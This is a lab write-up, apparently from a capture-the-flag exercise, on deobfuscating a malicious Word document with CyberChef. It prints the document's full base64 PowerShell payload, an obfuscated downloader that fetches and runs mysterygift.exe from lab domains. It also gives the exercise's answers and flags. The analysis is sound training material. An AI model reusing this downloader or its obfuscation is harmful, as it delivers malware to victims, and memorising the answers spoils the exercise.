# Day_07 [CyberChef] Maldocs roasting on an open fire

+ Deployable Website: No
+ Deployable Container: Yes

Description: In the previous task, we learned that McSkidy was indeed a victim of a spearphishing campaign that also contained a suspicious-looking document Division_of_labour-Load_share_plan.doc. McSkidy accidentally opened the document, and it's still unknown what this document did in the background. McSkidy has called on the in-house expert Forensic McBlue to examine the malicious document and find the domains it redirects to. Malicious documents may contain a suspicious command to get executed when opened, an embedded malware as a dropper (malware installer component), or may have some C2 domains to connect to.

> IP = 10.10.99.181

## LEARNING OBJECTIVES

+ What is CyberChef
+ What are the capabilities of CyberChef
+ How to leverage CyberChef to analyze a malicious document
+ How to deobfuscate, filter and parse the data

## NOTES

1. Cyberchef
2. Debfuscating

## LAUNCH THE INSTANCE

1. Start the machine
2. Download the `Division_of_labour-Load_share_plan.doc` file to local machine for analysis
3. Basic File Enumeration
   1. > file Division_of_labour-Load_share_plan.doc
      1. Division_of_labour-Load_share_plan.doc: Composite Document File V2 Document, Little Endian, Os: MacOS, Version 0.12, Code page: 10000, Author: Administrator, Template: Normal.dotm, Revision Number: 50, Name of Creating Application: Microsoft Office Word, Total Editing Time: 4d+01:49:00, Create Time/Date: Thu Nov 17 01:27:00 2022, Last Saved Time/Date: Thu Nov 24 15:47:00 2022, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0
   2. > strings Division_of_labour-Load_share_plan.doc > all_strings
   3. > strings -n 20 Division_of_labour-Load_share_plan.doc > narrowed_strings
4. CYBERCHEF
   1. Add the file to cyberchef for decoding/deobfuscating
   2. Run strings
      1. Change settings to 'All Printable Characters' & Increase the 'Minimum Length' to remove the noise and have meaningful data
         1. Min-Len = 258
            1. This gives us just the meaningful data
   3. Run Find/Replace
      1. We want to remove the `[_]` seperating each letter as this is tyring to obfuscate the code
      2. In the 'Find/Replace' box select REGEX and add `[\[\]\n_]`
         1. REGEX: we need to add '[]' around our selection of `[_]` but because the brackets are a special character we need a backslash `\` to escape the character. Then we need a new line for the `_` which gives us \n. So we get '[\[\]\n_]' as the final regex expression
      3. After removing the spaces we can see `P^Ow^er^she^L^L -w hidden -ENCOD` so we know this is trying to execute powershell
   4. Run Drop Bytes
      1. We need to drop bytes so we can access the base64 encoded string
      2. Start at a min of 0 and increase the max incrementally until the top bits are removed
      3. max = 124
         1. This gives us just the base64 payload

            ```base64
               UwBFAFQALQBWAGEAcgBJAEEAQgBsAGUAIAAgADgAaQBoADUANgA3ACAAIAAoACAAIABbAHQAWQBwAGUAXQAoACIAewAzAH0AewAwAH0AewA0AH0AewAyAH0AewAxAH0AIgAtAGYAJwBZAHMAVAAnACwAJwBSAGUAYwBUAE8AUgB5ACcALAAnAE0ALgBpAE8ALgBEAEkAJwAsACcAcwAnACwAJwBlACcAKQApADsAIAAgACAAUwBFAFQALQBJAHQAZQBtACAAKAAiAHYAQQAiACsAIgBSAGkAQQAiACsAIgBiAEwAZQA6AFIAIgArACIAaQAiACsAIgA3AHgATwAzACIAKQAgACgAWwBUAHkAUABlAF0AKAAiAHsAMgB9AHsANQB9AHsANAB9AHsAMwB9AHsAMQB9AHsAMAB9ACIALQBGACAAJwBSACcALAAnAE0AYQBOAGEARwBFACcALAAnAFMAJwAsACcAVgBJAGMARQBQAG8ASQBuAHQAJwAsACcALgBuAGUAVAAuAHMARQByACcALAAnAFkAcwB0AGUAbQAnACkAIAApACAAIAA7ACAAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACgAJwBTAGkAJwArACgAJwBsAGUAbgAnACsAJwB0ACcAKQArACgAJwBsACcAKwAnAHkAQwBvAG4AdAAnACkAKwAnAGkAJwArACgAJwBuACcAKwAnAHUAZQAnACkAKQA7ACQAdgBhAHIAXwBBAD0AJABQADUAOABCACAAKwAgAFsAYwBoAGEAcgBdACgANgA0ACkAIAArACAAJABaADEAOQBSADsAJABCADUAMwBOAD0AKAAoACcAUwAnACsAJwA3ADcAJwApACsAJwBIACcAKQA7ACAAIAAoACAAIABsAHMAIAAgAFYAYQByAEkAYQBCAEwARQA6ADgAaQBoADUANgA3ACAAIAApAC4AVgBhAGwAdQBlADoAOgAiAEMAUgBFAEEAdABgAEUAYABEAGAAaQBSAGUAYwBUAE8AcgBZACIAKAAkAEgATwBNAEUAIAArACAAKAAoACgAJwBlAE4ANwBSAHIAJwArACcAMQBzACcAKwAnAGoAOQBhACcAKwAnAGUATgAnACkAKwAnADcAJwArACgAJwBCACcAKwAnAGMAeAAnACkAKwAoACcANABpACcAKwAnAGEAeQBlACcAKQArACcATgA3ACcAKQAuACIAcgBlAFAAYABMAGEAYABjAEUAIgAoACgAWwBDAEgAYQBSAF0AMQAwADEAKwBbAEMASABhAFIAXQA3ADgAKwBbAEMASABhAFIAXQA1ADUAKQAsAEgAXwBUAHIAaQBuAEcAXQBbAEMASABhAFIAXQA5ADIAKQApACkAOwAkAFYANQA3AFIAPQAoACgAJwBCACcAKwAnADQANgAnACkAKwAnAFYAJwApADsAIAAoAHYAYQBSAEkAYQBCAGwAZQAgACgAIgBSACIAKwAiAGkAIgArACIANwB4AE8AMwAiACkAIAApAC4AVgBBAGwAVQBFADoAOgAiAFMAZQBDAHUAcgBJAGAAVABgAHkAUABgAFIATwBgAFQAbwBDAE8ATAAiACAAPQAgACgAKAAnAFQAJwArACcAbABzACcAKQArACcAMQAyACcAKQA7ACQAWAA0ADQAUwA9ACgAJwBTADgAJwArACcAMQBEACcAKQA7ACQAUABhADIAbgB1AHIANAAgAD0AIAAoACcASwAnACsAKAAnAF8AOQAnACsAJwBPACcAKQApADsAJABPADYANgBHAD0AKAAoACcARgA4ACcAKwAnADgAJwApACsAJwBXACcAKQA7ACQAQwB5AGcAMABrAHUANwA9ACQASABPAE0ARQArACgAKAAoACcAZQBBAHcAUgAnACsAJwByACcAKQArACgAJwAxACcAKwAnAHMAagA5AGEAZQBBACcAKQArACgAJwB3ACcAKwAnAEIAYwB4ACcAKQArACgAJwA0AGkAYQAnACsAJwB5ACcAKwAnAGUAQQAnACkAKwAnAHcAJwApACAALQByAGUAcABMAEEAQwBlACgAJwBlAEEAJwArACcAdwAnACkALABbAGMAaABhAFIAXQA5ADIAKQArACQAUABhADIAbgB1AHIANAArACgAJwAuAGQAJwArACcAbABsACcAKQA7ACQARQAwADEAQgA9ACgAJwBSADcAJwArACcAXwBTACcAKQA7ACQATQByAGsAagBjAGkAbQA9ACgAKAAnAF0AYgAnACsAJwAyACcAKQArACcASABfACcAKwAoACcAcwA6AC8ALwAnACsAJwBjAGQAbgAuACcAKQArACcAYgBhAG4AZAAnACsAJwBpACcAKwAnAHQAJwArACcAeQAnACsAKAAnAGUAJwArACcAdABpAC4AJwApACsAKAAnAHQAaABtAC8AJwArACcAZgBpAGwAZQBzACcAKQArACgAJwAvACcAKwAnAG0AeQAnACsAJwBzAHQAZQByAHkAJwApACsAKAAnAGcAaQBmAHQAJwArACcALgBlAHgAZQAnACsAJwBAAF0AJwArACcAYgAyACcAKQArACgAJwBIAF8AcwA6AC8AJwArACcALwAnACkAKwAoACcAZwAnACsAJwBvAG8AJwArACcAZwBsAGUAJwApACsAKAAnAC4AYwBvAG0AJwApACsAKAAnAC8AJwArACcAQABdACcAKQArACgAJwBiACcAKwAnADIASABfAHMAOgAnACsAJwAvACcAKwAnAC8AdwB3ACcAKQArACgAJwB3AC4AJwArACcAcwAnACkAKwAoACcAZQBjAHIAZQB0ACcAKwAnAFMAYQAnACsAJwBuAHQAYQAnACkAKwAoACcALgAnACsAJwBUAEgATQAnACkAKwAnAC8AJwArACgAJwBHAG8AbABkAGUAbgAnACsAJwB0AGkAJwApACsAJwBjACcAKwAnAGsAJwArACgAJwBlAHQAJwArACcALwAnACsAJwBUAEgATQBfAE0AWQBTAFQARQBSAFkAXwBGAEwAQQBHAEAAJwApACsAJwBdAGIAJwArACgAJwAyAEgAJwArACcAXwBzADoAJwApACsAKAAnAC8AJwArACcALwAnACsAJwBjAGQAbgAnACkAKwAoACcALgAnACsAJwBiAGEAbgBkACcAKwAnAGkAJwApACsAJwB0AHkAZQAnACsAKAAnAHQAaQAnACsAJwAuACcAKQArACcAVABIAE0AJwArACgAJwAvAGYAaQBsAGUAcwAvAGkAbgBkAGUAeAAvACkALgAgACIAcgBFAFAAbABBAGAAYwBFACIAKAAoACcAXQBiADIAJwArACgAJwBIACcAKwAnAF8AJwApACkALAAoAFsAYQByAHIAYQB5AF0AKAAnAHMAZAAnACwAJwBzAHcAJwApACwAKAAnAGgAdAAnACsAJwB0AHAAJwApACwAJwAzAGQAJwApAFsAMQBdACkALgAiAHMAUABsAGAASQB0ACIAKAAkAFQAMgA2AEEAIAArACAAJAB2AGEAcgBfAEEAIAArACAAJABCADcANQBQACkAOwAkAFcANwAxAFQAPQAoACgAJwBQACcAKwAnADkAMwAnACkAKwAnAFgAJwApADsAZgBvAHIAZQBhAGMAaAAgACgAJAB2AGEAcgBfAEIAIABpAG4AIAAkAE0AcgBrAGoAKQB7AHQAcgB5AHsAKAAuACgAJwBOAGUAJwArACcAdwAtAE8AYgBqAGUAYwAnACsAJwB0ACcAKQAgAHMAWQBzAHQAZQBNAC4AbgBlAHQALgBXAEUAYgBDAEwAaQBFAG4AdAApAC4AIgBEAE8AdwBOAEwAbwBBAGQAZgBgAEkAYABMAGUAIgAoACQAdgBhAHIAXwBCACwAIAAkAEMAeQBnADAAawB1ADcAKQA7ACQARwA3ADUAUQA9ACgAJwBXACcAKwAoACcAOAAnACsAJwBfAFIAJwApACkAOwBJAGYAIAAoACgAJgAoACcARwBlAHQALQBJAHQAJwArACcAZQAnACsAJwBtACcAKQAgACQAQwB5AGcAMABrAHUANwApAC4AIgBsAGAAZQBuAGcAdABoACIAIAAtAGcAZQAgADMAMAA1ADcANQApACAAewAuACgAJwByACcAKwAnAHUAbgBkAGwAbAAzADIAJwApACAAJABDAHkAZwAwAGsAdQA3ACwAKAAnAEMAbwAnACsAKAAnAG4AdAAnACsAJwByAG8AbABfAFIAdQAnACsAJwBuACcAKQArACgAJwBEACcAKwAnAEwATAAnACkAKQAuACIAVABgAG8AcwBUAHIAYABJAE4ARwAiACgAKQA7ACQAQgAyADkARAA9ACgAJwBaACcAKwAoACcANgAnACsAJwAyAFcAJwApACkAOwBiAHIAZQBhAGsAOwAkAEYAMgA2AEYAPQAoACcAVgAnACsAKAAnADMANwAnACsAJwBXACcAKQApAH0AfQBjAGEAdABjAGgAewB9AH0AJABKADEAXwBOAD0AKAAnAFQAMAAnACsAJwA4AEgAJwApAA==
            ```

         2. Now lets decode this
   5. Run From Base64
      1. This now gives us the decoded base64 and we can see this is definitely a PowerShell Script
      2. However we still have `.` and other extra characters
         1. Lets try changing the decoding format
   6. Run Decode Text
      1. "In Windows PowerShell, the default encoding is usually Windows-1252, an extension of latin-1, also known as ISO 8859-1" - QUOTE FROM MICROSOFT WEBSITE
      2. Select `ISO-8859-1 Latin 1 Western European (28591)` as the encoded format
      3. Now we need to remove the extra characters (ie. ' ( ) + ' ` ")
   7. Run Find/Replace
      1. To remove the extra characters we need to use ['()+'"`] as the regular expression
   8. Run Find/Replace
      1. Examining the code we see a functio where it replaces the charaters `b2H_` with an item in the array [sd,sw,http,3d] so lets try and replace all `b2h_` with `http`
      2. Change from REGEX to Simple String
      3. Input `b2h_` and replace with `http`
      4. So now lets try and extract these URL's
   9. Run Extract URL's
      1. Woohoo! We see s alist of URL's
      2. But there are `@` symbols at the end of each so lets split these lines on `@`
   10. Run Split
       1. Split each line on the `@` symbol
       2. Awesome! Now that we have all the malicious URL's we are set.
       3. For best pratice we want to DEFANG the URL's that way they cant accidentally be clicked
   11. Run Defang URL
        1. Escape dots
        2. Escape http
        3. Escape ://

            ```text
               hxxps[://]cdn[.]bandityeti[.]thm/files/mysterygift[.]exe

               hxxps[://]google[.]com/

               hxxps[://]www[.]secretSanta[.]THM/Goldenticket/THM_MYSTERY_FLAG

               hxxps[://]cdn[.]bandityeti[.]THM/files/index/
            ```

## QUESTIONS

1. What is the version of CyberChef found in the attached VM?
   1. `9.49.0`
      1. We found this from the URL when running CyberChef on the AttackBox
2. How many recipes were used to extract URLs from the malicious doc?
   1. `10`
3. We found a URL that was downloading a suspicious file; what is the name of that malware?
   1. `mysterygift.exe`
4. What is the last defanged URL of the bandityeti domain found in the last step?
   1. `hxxps[://]cdn[.]bandityeti[.]THM/files/index/`
5. What is the ticket found in one of the domains? (Format: Domain/<GOLDEN_FLAG>)
   1. `THM_MYSTERY_FLAG`
